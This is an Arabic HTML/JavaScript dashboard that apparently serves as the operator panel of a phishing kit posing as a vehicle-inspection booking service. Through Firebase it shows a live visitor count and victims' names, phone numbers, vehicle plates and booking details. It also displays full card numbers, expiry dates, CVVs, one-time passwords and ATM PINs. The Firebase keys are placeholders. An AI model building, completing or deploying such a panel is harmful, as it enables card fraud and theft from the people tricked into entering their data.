<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الاحترافية</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
        .navbar { background: #006C35; padding: 15px; display: flex; justify-content: center; gap: 10px; sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .nav-btn.active { background: white; color: #006C35; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
        .container { padding: 20px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        /* قسم البيانات الشخصية (العملاء) */
        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .customer-card { background: white; border-radius: 10px; padding: 20px; border-right: 10px solid #006C35; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: relative; }
        .time-tag { position: absolute; left: 15px; top: 15px; background: #e8f5e9; color: #2e7d32; padding: 5px 10px; border-radius: 5px; font-size: 12px; }
        
        /* قسم البطاقات */
        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 15px; border: 1px solid #ddd; flex-wrap: wrap; }
        .box { padding: 10px; border-radius: 5px; font-weight: bold; font-size: 14px; }
        .card-info { background: #fff9db; color: #856404; border: 1px solid #ffe066; }
        .otp-info { background: #fff0f0; color: #c92a2a; border: 1px solid #ffc9c9; }
        .btn-del { background: #fa5252; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر</div>

<div class="navbar">
    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز (المركبات)</button>
    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
</div>

<div class="container">
    <div id="bookingSection" class="tab-content active">
        <div id="bookingGrid" class="booking-grid">
            </div>
    </div>

    <div id="cardsSection" class="tab-content">
        <div id="paymentsContainer">
            </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "YOUR_API_KEY",
        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
        databaseURL: "YOUR_DATABASE_URL",
        projectId: "YOUR_PROJECT_ID",
        storageBucket: "YOUR_PROJECT_ID.appspot.com",
        messagingSenderId: "YOUR_SENDER_ID",
        appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // تحديث عداد الزوار
    db.ref('presence').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());

    // عرض بيانات الحجز (المركبات)
    db.ref('bookings').on('value', (snapshot) => {
        const grid = document.getElementById('bookingGrid');
        grid.innerHTML = '';
        snapshot.forEach((child) => {
            const d = child.val();
            grid.innerHTML += `
                <div class="customer-card">
                    <span class="time-tag">وصلت الآن</span>
                    <h3>${d.name || 'غير معروف'}</h3>
                    <p>🚗 المركبة: ${d.vehicleType || '-'} (${d.vehicleNumber || '-'})</p>
                    <p>📍 المنطقة: ${d.region || '-'} | المركز: ${d.center || '-'}</p>
                    <p>📅 التاريخ: ${d.date || '-'} | الوقت: ${d.time || '-'}</p>
                    <p>📞 الجوال: ${d.phone || '-'}</p>
                    <button class="btn-del" onclick="deleteItem('bookings/${child.key}')">حذف</button>
                </div>`;
        });
    });

    // عرض بيانات البطاقات
    db.ref('payments').on('value', (snapshot) => {
        const container = document.getElementById('paymentsContainer');
        container.innerHTML = '';
        snapshot.forEach((child) => {
            const d = child.val();
            container.innerHTML += `
                <div class="operation-row">
                    <div style="min-width:120px"><b>${d.name || 'عميل'}</b></div>
                    <div class="box card-info">💳 ${d.cardNumber || '----'} | ${d.exp || '--'} | ${d.cvv || '--'}</div>
                    <div class="box otp-info">🔐 OTP: ${d.otp || '----'} | ATM: ${d.atm || '----'}</div>
                    <button class="btn-del" onclick="deleteItem('payments/${child.key}')">حذف</button>
                </div>`;
        });
    });

    function deleteItem(path) { if(confirm('متأكد؟')) db.ref(path).remove(); }

    function openTab(evt, tabName) {
        var i, tabcontent, navbtns;
        tabcontent = document.getElementsByClassName("tab-content");
        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
        navbtns = document.getElementsByClassName("nav-btn");
        for (i = 0; i < navbtns.length; i++) navbtns[i].className = "nav-btn";
        document.getElementById(tabName).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
